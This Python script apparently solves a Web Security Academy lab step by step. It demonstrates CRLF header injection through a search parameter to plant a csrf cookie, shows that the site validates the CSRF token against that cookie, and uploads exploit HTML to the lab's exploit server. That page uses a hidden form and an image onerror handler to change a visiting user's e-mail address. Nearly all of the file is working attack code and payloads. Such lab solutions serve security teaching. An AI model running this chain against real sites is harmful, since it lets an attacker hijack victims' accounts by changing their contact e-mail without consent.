import requests
import sys
from bs4 import BeautifulSoup
import urllib.parse

site = 'ac8f1fa71f215840c01b57be0075005a.web-security-academy.net'

#======================================================================
# Show the header injection vulnerability to set a cookie
def getHeadersFromSearch(search_term):
  input(f'Get headers from search\n------------\n{search_term}\n------------')
  resp = requests.get(f"https://{site}/?search={search_term}")
  for header in resp.headers.items():
    print(header)
getHeadersFromSearch("wuchang")
print('\n')
# Causes a header to be injected in the response
getHeadersFromSearch("wuchang\nfoo: bar")
print('\n')
# Inject a header that sets a cookie value foo to bar
getHeadersFromSearch("wuchang\nSet-Cookie: foo=bar")
print('\n')

#======================================================================
#  This section used to show the CSRF token cookie being set on initial GET request
#    Site is using value of csrf cookie to validate csrf token in form submission
input("Visit login page to obtain CSRF token.  See it set the token in a cookie:")
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
print(f' csrf field in form field: {csrf}')
print('======== resp.headers are ==========')
for header in resp.headers.items():
    print(header)
print('======== s.cookies are ==========')
for cookie in s.cookies.items():
    print(cookie)

input("\n\nGet csrf token, clear cookie, and attempt to use csrf token\nSee that cookie used to validate csrf token in form submission:")
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
s.cookies.clear()
logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}
resp = s.post(login_url, data=logindata)
print(f"HTTP status code {resp.status_code} with text {resp.text}\n")

input("Set csrf cookie and token to wuchang to see you can login:")
logindata = {
    'csrf' : 'wuchang',
    'username' : 'wiener',
    'password' : 'peter'
}
cookiedata = {
    'csrf' : 'wuchang'
}
resp = requests.post(login_url, data=logindata, cookies=cookiedata)
print(f"HTTP status code {resp.status_code}")
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
print(f"CSRF token in successful response is {csrf}")

#======================================================================
# Craft the exploit and upload it
input("\n\nUpload exploit that injects header to set cookie to foo\nand submits form with csrf token set to foo.\nSee it causes an automatic login attempt using bogus credentials by simply visiting page:")
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

search_term = urllib.parse.quote("wuchang\nSet-Cookie: csrf=foo")
search_url = f'https://{site}/?search={search_term}'
print(f'Exploit loads an image that points to the HTTP request that sets csrf token ({search_url})')
print(f' Then onerror, will send the login form post with chosen csrf token')
exploit_html = f'''
    <form action="{login_url}" method="POST">
    <input type="hidden" name="username" value="wiener">
    <input type="hidden" name="password" value="want_a_failed_login_to_avoid_spoiling_solve">
    <input type="hidden" name="csrf" value="foo">
    </form>
    <img src="{search_url}" onerror="document.forms[0].submit();">
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)

# Solve level by changing e-mail.  Note that the site may
#   need to be reset before this works due to prior attempts
exploit_html = f'''
	<form action="https://{site}/my-account/change-email" method="POST">
  	<input type="hidden" name="email" value="madler@pdx.edu">
    <input type="hidden" name="csrf" value="foo">
	</form>
	<img src="{search_url}"	onerror="document.forms[0].submit();">
'''

input("\n\nUpload exploit that changes the e-mail of viewer\nVisit page to see address changed:")
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)